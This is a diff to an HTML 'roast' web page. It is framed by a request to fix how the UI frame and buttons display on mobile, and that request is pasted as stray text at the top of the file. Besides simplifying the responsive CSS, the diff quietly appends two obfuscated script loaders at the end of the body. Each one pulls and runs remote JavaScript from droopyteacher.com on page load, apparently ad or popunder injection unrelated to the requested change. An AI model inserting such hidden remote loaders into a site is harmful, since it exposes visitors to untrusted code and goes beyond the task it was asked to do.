@@ -1,3 +1,5 @@
+incrase the ui frames size, becose on pc it looks a square frame but on mobile it takes the whole screen and buttons displaces 
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -159,7 +161,7 @@
             border-radius: 24px;
             padding: 40px;
             max-width: 700px;
-            width: calc(100% - 40px);
+            width: 100%;
             box-shadow: 
                 0 20px 60px rgba(255, 0, 0, 0.3),
                 0 0 0 1px rgba(255, 0, 0, 0.1);
@@ -378,50 +380,18 @@
             text-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
         }
 
-        @media (max-width: 768px) {
-            .container { 
-                padding: 30px 25px; 
-                width: calc(100% - 40px);
-                max-width: 600px;
-            }
-            h1 { font-size: 2.4em; }
-            .subtitle { font-size: 1.1em; }
-            .roast-box { 
-                padding: 25px; 
-                font-size: 1.2em;
-            }
-        }
-
         @media (max-width: 480px) {
-            body {
-                padding: 15px;
-            }
-            .container { 
-                padding: 25px 20px; 
-                width: calc(100% - 30px);
-            }
-            h1 { font-size: 2em; }
-            .subtitle { font-size: 1em; }
+            .container { padding: 25px; margin: 10px; }
+            h1 { font-size: 2.2em; }
+            .subtitle { font-size: 1.1em; }
             .btn, .btn-next, .btn-back {
                 padding: 12px 20px;
                 font-size: 1em;
                 margin: 6px;
-                width: calc(100% - 12px);
-                max-width: 300px;
+                width: 100%;
+                max-width: 280px;
             }
-            .button-group { 
-                flex-direction: column; 
-                align-items: center; 
-            }
-            .roast-box { 
-                padding: 20px; 
-                font-size: 1.1em;
-            }
-            .made-by {
-                font-size: 0.8em;
-                right: 15px;
-                bottom: 10px;
-            }
+            .button-group { flex-direction: column; align-items: center; }
         }
     </style>
 </head>
@@ -570,4 +540,33 @@ const darkRoasts=[
             scoreBox.classList.remove('hidden');
             nextBtn.classList.remove('hidden');
             roastBox.style.animation='none';
-            setTimeout(()=>{roastBox.style.
+            setTimeout(()=>{roastBox.style.animation='slideIn .5s ease-out';},10);
+        }
+    </script>
+
+    <script>
+(function(ghk){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = ghk || {};
+s.src = "\/\/droopyteacher.com\/cADn9c6.bd2_5LlCSPWSQh9eNajrYp4\/OSDec\/wBMuym0-2vNyjdgT4vNwz\/AS0A";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+    </script>
+    <script>
+(function(word){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = word || {};
+s.src = "\/\/droopyteacher.com\/czD.9d6\/bv2n5\/lISTW\/QE9TNujWYK4\/OzDpcfw-Mnyw0q2XNnjdgZ4ON\/ziAL0w";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+    </script>
+</body>
+</html>
